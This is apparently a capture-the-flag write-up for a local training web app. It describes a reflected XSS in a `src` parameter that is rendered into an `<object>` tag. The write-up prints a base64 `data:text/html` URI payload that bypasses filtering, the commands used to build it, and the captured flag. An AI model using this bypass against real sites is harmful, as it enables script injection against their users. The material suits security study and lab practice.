## [Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)

TODO: HTML Injection?

The index page has a weirdly loaded image http://localhost:8080/index.php?page=media&src=nsa.

Visiting the page and changing the `src` query parameter shows an HTML `<object>` tag, with a `data` attribute which corresponds to `src`. For example, visiting `http://localhost:8080/index.php?page=media&src=ooga` yields `<object data="ooga">`.

We start by trying an HTML injection with `src=<script>confirm("ooga")</script>`, which wasn't executed.

We managed to bypass the URL encoding with base64, and do an XSS attack.

```console
$ echo -n '<script>confirm("ooga")</script>' | base64
PHNjcmlwdD5jb25maXJtKCJvb2dhIik8L3NjcmlwdD4=
```

this gives us a double wrong answer as http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==

but putting something in the alert

```
➜  darklyProject git:(master) ✗ echo '<script>alert("ok")</script>' | base64
PHNjcmlwdD5hbGVydCgib2siKTwvc2NyaXB0Pgo=
```

gets us the flag

```
The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```
